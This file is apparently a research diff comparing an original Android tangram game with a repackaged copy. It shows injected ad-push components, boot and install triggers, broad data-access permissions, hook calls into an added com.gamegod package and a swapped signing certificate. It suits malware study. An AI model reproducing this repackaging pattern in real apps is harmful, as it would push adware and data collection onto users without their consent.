@@ -1,0 +1,200 @@
+diff -r result/APP_82/App_B_82/AndroidManifest.xml result/APP_82/App_M_82/AndroidManifest.xml
+13a14,41
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.kuguo.ad.MainActivity" android:theme="@android:style/Theme.Dialog"/>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.kuguo.ad.BoutiqueActivity" android:theme="@android:style/Theme.Dialog"/>
+>         <service android:name="com.kuguo.ad.MainService"/>
+>         <receiver android:name="com.kuguo.ad.MainReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="net.crazymedia.iad.AdPushActivity"/>
+>         <receiver android:name="net.crazymedia.iad.AdPushReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="net.crazymedia.iad.AdPushService"/>
+>         <meta-data android:name="UMENG_APPKEY" android:value="500fc8cf5270155c50000017"/>
+>         <meta-data android:name="UMENG_CHANNEL" android:value="gfan"/>
+14a43,56
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="com.android.vending.BILLING"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.READ_LOGS"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+>     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+diff -r result/APP_82/App_B_82/apktool.yml result/APP_82/App_M_82/apktool.yml
+2c2
+< apkFileName: Bapp82-BCA240132F73FB1965DEB6547EC5887077238C7BD431B3AFA516A5309E704ADA.apk
+---
+> apkFileName: Mapp82-A287546C13492798F5903EAB3EC0D648A23CAE795C05274A74674EADD7214AF9.apk
+5d4
+< - resources.arsc
+Somente em result/APP_82/App_M_82/assets: AGENCYB.TTF
+Somente em result/APP_82/App_M_82/assets: AGENCYR.TTF
+Somente em result/APP_82/App_M_82/assets: kuguo_res
+diff -r result/APP_82/App_B_82/com/divmob/tangram/GameActivity.java result/APP_82/App_M_82/com/divmob/tangram/GameActivity.java
+20a21
+> import com.gamegod.touydig;
+57a59
+>     touydig.init(this);
+71a74
+>     touydig.destroy(this);
+Somente em result/APP_82/App_M_82/com: gamegod
+Somente em result/APP_82/App_M_82/com: kuguo
+Somente em result/APP_82/App_M_82/com: umeng
+Somente em result/APP_82/App_M_82/: net
+Os arquivos binários result/APP_82/App_B_82/original/AndroidManifest.xml e result/APP_82/App_M_82/original/AndroidManifest.xml são diferentes
+Somente em result/APP_82/App_B_82/original/META-INF: CERT.RSA
+Somente em result/APP_82/App_B_82/original/META-INF: CERT.SF
+diff -r result/APP_82/App_B_82/original/META-INF/MANIFEST.MF result/APP_82/App_M_82/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0 (Sun Microsystems Inc.)
+18a19,21
+> Name: assets/kuguo_res/rating_half.png
+> SHA1-Digest: S00vYSJAZN4Kp03dNJ9JV3C7gyA=
+> 
+72a76,78
+> Name: assets/kuguo_res/kuguo_side.png
+> SHA1-Digest: /yJxD5QPHvZTl9gVzckrOwkqsVc=
+> 
+93a100,102
+> Name: assets/AGENCYR.TTF
+> SHA1-Digest: qR/OXN2U0fMIwdRH7mEq3tAw7qA=
+> 
+132a142,144
+> Name: assets/kuguo_res/spot_default.png
+> SHA1-Digest: E4fi2Oiw3vnkWEnhps2hIa4+gp8=
+> 
+219a232,234
+> Name: assets/AGENCYB.TTF
+> SHA1-Digest: UIp4i9RemVNCgeT8ltLXtT2F7OM=
+> 
+318a334,336
+> Name: assets/kuguo_res/kuguo_side2.png
+> SHA1-Digest: TV5gKbN886OE4Zydpl4+L+LOYmU=
+> 
+360a379,384
+> Name: assets/kuguo_res/installed.png
+> SHA1-Digest: i1GhQd02nmGumG0Efgq4KVtZY4I=
+> 
+> Name: assets/kuguo_res/360.png
+> SHA1-Digest: l+Fj8rnP63ymLQTbbTeI2n7q89k=
+> 
+438a463,465
+> Name: assets/kuguo_res/confirm_btn_pressed.png
+> SHA1-Digest: mNxr9OFpueKt9Rn83vsUCcm3roc=
+> 
+462a490,492
+> Name: assets/kuguo_res/kuguo_top_pressed.png
+> SHA1-Digest: /tDiKS+zIjOO9zZ1+KBFGJLvlxs=
+> 
+465a496,498
+> Name: assets/kuguo_res/rating_full.png
+> SHA1-Digest: OrNYZwr7L4Fc/g6m44wteyioSI0=
+> 
+491c524
+< SHA1-Digest: UFZxDA7uLra/uW72GhoufNq/cQE=
+---
+> SHA1-Digest: yWRGSwhRZo4nyI1HUokD5fN5soo=
+515c548
+< SHA1-Digest: gvR8CZTOMp+eF1pII5TaPZoqNLc=
+---
+> SHA1-Digest: OM0LPXLF9SWLpRAmw8tk+NMiYE8=
+540a574,576
+> Name: assets/kuguo_res/push_cancel_btn_pressed.png
+> SHA1-Digest: UhRfBMZZGUHgA1i0uGFbOWx4SEk=
+> 
+570a607,609
+> Name: assets/kuguo_res/download_btn2.png
+> SHA1-Digest: mnoiAMSb+9/PFWSZZ/2ThYkuDYs=
+> 
+572c611,614
+< SHA1-Digest: z5c3bgRCmAhnPNZ/r1VBiyHvhvU=
+---
+> SHA1-Digest: R5yLs8yHAbgfJWOjVy+J3DNqUXY=
+> 
+> Name: assets/kuguo_res/push_cancel_btn.png
+> SHA1-Digest: zQ+3kBPQs5wwK+CNfm0vSZe9VYc=
+582a625,627
+> Name: assets/kuguo_res/icon.png
+> SHA1-Digest: xojjGOMaFE9l5JGijGWsO/RgymY=
+> 
+588a634,639
+> Name: assets/kuguo_res/fold_arrow.png
+> SHA1-Digest: aPV5nrym+b3yv4JxlPO9BHg6+k0=
+> 
+> Name: assets/kuguo_res/download_btn2_pressed.png
+> SHA1-Digest: JqsMeWSOWGXiCsvHrx3OJD5JLEM=
+> 
+591a643,645
+> Name: assets/kuguo_res/kuguo_top.png
+> SHA1-Digest: +stugZmNOH1w3MN6Y0DAYL5g8zk=
+> 
+609a664,666
+> Name: assets/kuguo_res/spot_light.png
+> SHA1-Digest: HDYglOL1e3Rk0VmuY8QCQ0oNoTs=
+> 
+677c734
+< SHA1-Digest: cHAI/r/p6REp1EwpK3cdjUmg/RI=
+---
+> SHA1-Digest: VCj/BLzVuzS2UdZ6R2WK3WEYfI8=
+717a775,777
+> Name: assets/kuguo_res/snapshot_empty.png
+> SHA1-Digest: DSmTSCP3TKTP8Cw8/9byyIcYP28=
+> 
+774a835,837
+> Name: assets/kuguo_res/kuguo.png
+> SHA1-Digest: RuPZmtaRC1tisx8zwArgndvGfA8=
+> 
+787,789d849
+< Name: lib/armeabi/libandenginephysicsbox2dextension.so
+< SHA1-Digest: CHCSo4LaX8hI+zWFtxdTVlNzczg=
+< 
+792a853,855
+> Name: lib/armeabi/libandenginephysicsbox2dextension.so
+> SHA1-Digest: CHCSo4LaX8hI+zWFtxdTVlNzczg=
+> 
+810a874,876
+> Name: assets/kuguo_res/confirm_btn.png
+> SHA1-Digest: bKjU+M74YySS1qW5nxZ+v4udGCk=
+> 
+860a927,929
+> 
+> Name: assets/kuguo_res/rating_empty.png
+> SHA1-Digest: /pdjhl209wEvFa24abz75d7jrts=
+Somente em result/APP_82/App_M_82/original/META-INF: RANGFEI.RSA
+Somente em result/APP_82/App_M_82/original/META-INF: RANGFEI.SF
+diff -r result/APP_82/App_B_82/smali/com/divmob/tangram/GameActivity.smali result/APP_82/App_M_82/smali/com/divmob/tangram/GameActivity.smali
+90a91,92
+>     invoke-static {p0}, Lcom/gamegod/touydig;->init(Landroid/content/Context;)V
+> 
+158a161,162
+> 
+>     invoke-static {p0}, Lcom/gamegod/touydig;->destroy(Landroid/content/Context;)V
+Somente em result/APP_82/App_M_82/smali/com: gamegod
+Somente em result/APP_82/App_M_82/smali/com: kuguo
+Somente em result/APP_82/App_M_82/smali/com: umeng
+Somente em result/APP_82/App_M_82/smali: net
